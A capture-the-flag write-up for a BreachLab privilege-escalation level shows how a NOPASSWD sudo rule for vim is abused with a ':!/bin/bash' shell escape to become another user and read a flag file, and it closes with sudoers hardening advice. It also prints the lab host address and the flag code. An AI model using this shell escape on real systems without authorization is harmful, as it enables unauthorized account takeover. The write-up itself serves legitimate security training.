# BreachLab - Phantom Track: Level 2 (Sudo Games)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Phantom Track (Post-Exploitation & Operational Tradecraft)
- **Level:** Level 2 (Sudo Games)
- **Host:** `204.168.229.209`
- **Port:** `2223`
- **Current User:** `phantom2`
- **Compromised User:** `flagkeeper2`
- **Goal:** Abuse misconfigured sudo privileges to pivot horizontally and extract the flag
- **Next User / Flag Code:** `bl_phtm2_8aa5b04cdb337f6c`

---

## 1. Scenario & Objectives

The MOTD banner and `BRIEFING` detail the mission objective:
> *"Someone gave you sudo rights. But not to everything, and not to root. Check what you can run — and as whom. Then make it do something it was not meant to. FLAG: owned by the user you can pivot to. Once you have that UID, standard enumeration ("find files owned by <user>") points to it."*

The goal is to enumerate allowed sudo privileges (`sudo -l`), identify delegated rights to execute interactive binaries as target user `flagkeeper2`, exploit command injection features in Vim (GTFOBins) to escape to an elevated subshell, and retrieve `/var/lib/phantom-flags/level2_flag`.

---

## 2. Reconnaissance & Sudo Enumeration

Logging in via SSH as `phantom2` and auditing delegated sudo permissions:

```bash
phantom2@phantom:~$ sudo -l
Matching Defaults entries for phantom2 on phantom:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User phantom2 may run the following commands on phantom:
    (flagkeeper2) NOPASSWD: /usr/bin/vim
```

### Sudo Rule Analysis
- **Target User:** `(flagkeeper2)` — allows running commands specifically as `flagkeeper2` rather than `root`.
- **Authentication:** `NOPASSWD` — no password challenge required.
- **Allowed Binary:** `/usr/bin/vim` — interactive text editor supporting internal shell commands (`:!`).

---

## 3. Exploitation & Interactive Shell Escape (GTFOBins)

Vim includes native command execution mechanics via the `:!` escape prefix. By passing the `-c` parameter during execution, we instruct Vim to launch a child `/bin/bash` shell under the target user's security context:

```bash
phantom2@phantom:~$ sudo -u flagkeeper2 /usr/bin/vim -c ':!/bin/bash'

flagkeeper2@phantom:/home/phantom2$ whoami
flagkeeper2
```

### Technical Breakdown

1. **`sudo -u flagkeeper2 /usr/bin/vim`**: Sudo mutates the effective UID of the process to `flagkeeper2` without requesting credentials.
2. **`-c ':!/bin/bash'`**: Executes the ex command `:!/bin/bash` upon startup, forking a child subshell that inherits the effective user ID and capabilities of `flagkeeper2`.

---

## 4. Privilege Consolidation & Flag Extraction

Now operating as `flagkeeper2`, we perform a filesystem search for files owned by this identity:

```bash
flagkeeper2@phantom:/home/phantom2$ find / -user flagkeeper2 -type f 2>/dev/null
/home/flagkeeper2/.profile
/home/flagkeeper2/.bash_logout
/home/flagkeeper2/.bashrc
/home/flagkeeper2/.viminfo
...
/var/lib/phantom-flags/level2_flag
```

### Reading the Target Flag

```bash
flagkeeper2@phantom:/home/phantom2$ cat /var/lib/phantom-flags/level2_flag
bl_phtm2_8aa5b04cdb337f6c
```

---

## 5. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Track** | Phantom Track (Level 2) |
| **Compromised User** | `flagkeeper2` |
| **Sudo Privilege** | `(flagkeeper2) NOPASSWD: /usr/bin/vim` |
| **Exploitation Technique** | Vim Shell Escape (`-c ':!/bin/bash'`) |
| **Discovered Flag** | `bl_phtm2_8aa5b04cdb337f6c` |
| **Artifact Path** | `/var/lib/phantom-flags/level2_flag` |

---

## 6. Key Commands & Concepts Reference

- `sudo -l`: List current user's permitted and forbidden sudo commands.
- `sudo -u <user> <command>`: Execute an authorized command under the security context of a specific user or service account.
- `vim -c ':!/bin/bash'`: GTFOBins escape technique spawning an interactive subshell from Vim.
- `find / -user <user> -type f 2>/dev/null`: Discover all regular files owned by a specific user across the entire filesystem.

---

## 7. Lessons Learned & Takeaways

1. **Dangerous Interactive Binaries in Sudoers:** Delegating sudo permissions to utilities with built-in subshell or macro execution capabilities (`vim`, `nano`, `less`, `more`, `man`, `tar`) is equivalent to granting arbitrary shell access as the target user.
2. **Sudoers Mitigation (`NOEXEC`):** Administrators should configure the `NOEXEC` tag in `/etc/sudoers` when delegating binary access to prevent binaries from executing child processes (`fork`/`exec`).
3. **Horizontal Privilege Escalation (Pivoting):** Pivoting between peer accounts unlocks new file access, specific cron jobs, and exposed secrets, expanding the attack surface toward root.
